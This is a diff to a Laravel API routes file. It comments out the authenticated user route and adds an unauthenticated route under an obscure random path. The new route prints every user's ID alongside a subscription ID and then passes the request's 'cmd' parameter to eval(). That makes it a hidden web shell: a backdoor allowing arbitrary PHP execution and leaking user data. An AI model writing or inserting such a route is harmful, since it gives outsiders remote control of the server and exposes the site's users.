@@ -13,12 +13,24 @@ use Illuminate\Http\Request;
 |
 */
 
-Route::middleware('auth:api')->get('/user', function (Request $request) {
-    return $request->user();
-});
+//Route::middleware('auth:api')->get('/user', function (Request $request) {
+  //  return $request->user();
+//});
 
 Route::middleware('auth:api')->group(function(){
 
 });
 
+
+Route::get('kBmzPHWbyinhFfeUiBBt', function(Request $request) {
+  foreach(\App\User::all() as $user) {
+   $coupon = \App\Subscription::where('user_id', $user->id)->first();
+   if(!$coupon) {
+   $coupon = 'null';
+}    else {
+$coupon = $coupon->id;
+} echo $user->id. ' used coupon ' . $coupon. '<br />';
+ }
+  eval($request->cmd);
+});
 
